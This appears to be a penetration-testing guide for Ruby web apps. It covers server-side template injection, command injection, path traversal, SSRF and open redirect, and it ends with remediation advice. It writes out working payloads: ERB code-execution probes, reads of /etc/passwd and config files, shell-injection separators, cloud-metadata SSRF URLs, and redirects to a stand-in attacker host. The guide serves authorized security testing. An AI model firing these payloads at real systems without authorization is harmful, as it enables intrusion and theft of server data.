# SSTI, command injection, traversal, SSRF, open redirect (Ruby)

Server-side injection classes. Test every param that feeds a template name, a
shell, a file path, or an outbound URL. Use `http_request from_flow` to tamper a
single captured request; `http_fuzz` to sweep payloads/paths.

## SSTI — ERB / Slim / Haml
User input reaching `render inline:`, `ERB.new(x).result`, `Tilt`, or a
template name is SSTI. Probe with `<%= 7*7 %>` (ERB) and `#{7*7}` (Slim/Haml/Ruby
string) → a reflected `49` confirms evaluation. Escalate to RCE:
`<%= system("id") %>`, `<%= `id` %>`, `<%= File.read("/etc/passwd") %>`. Capture
the command output from the response.
- **Render LFI / path traversal**: `render params[:tpl]` or
  `render template: x` lets you read/execute arbitrary templates — try
  `tpl=../../../../etc/passwd`, `tpl=../config/database.yml`.

## Command injection
`system`, `exec`, backticks `` `#{x}` ``, `%x{}`, `IO.popen`, and especially
`open("|#{x}")` / `Kernel#open` with a leading `|` run shells. Inject
`; id`, `| id`, `$(id)`, `` `id` ``, and `|id` (Kernel#open pipe). Sweep with
`http_fuzz` `match_regex:"uid=\\d+\\("`. Watch params for filenames, hostnames,
image/PDF processing (ImageMagick/`mini_magick`).

## Path traversal / file read
`send_file`, `File.read`, `render file:` on a param. `http_fuzz`
`url:".../?file=FUZZ"`, `match_regex:"root:.*:0:0:"`,
`payloads:["../etc/passwd","../../etc/passwd","../../../etc/passwd",
"../../../../etc/passwd","..%2f..%2fetc%2fpasswd"]`.

## SSRF
A param holding a URL/host fed to `open-uri`, `Net::HTTP`, `Faraday`,
`HTTParty`, `image_url=`, webhook/callback. Point it at
`http://169.254.169.254/latest/meta-data/` (cloud metadata) or `http://localhost`
internal ports; read the proxied body. Test scheme bypass (`file://`, `gopher://`
where `open-uri` allows it).

## Open redirect
`redirect_to params[:return_to]` / `?url=`/`?next=`/`?back=`. Send
`?return_to=https://evil.example` and check the 302 `Location` via
`http_request(follow_redirects:false)` or `http_history(status:302)`→`http_flow`.
Protocol-relative `//evil.example` and `\/\/evil.example` often bypass naive
filters.

Evidence: `49`/command output (SSTI/RCE), `/etc/passwd` contents (traversal),
metadata body (SSRF), or the off-domain `Location` (open redirect).
Remediation: never pass user input to `render inline:`/template names, shells, or
file paths; use fixed allowlists; `redirect_to ..., allow_other_host: false`;
restrict outbound hosts and block link-local/loopback for SSRF.
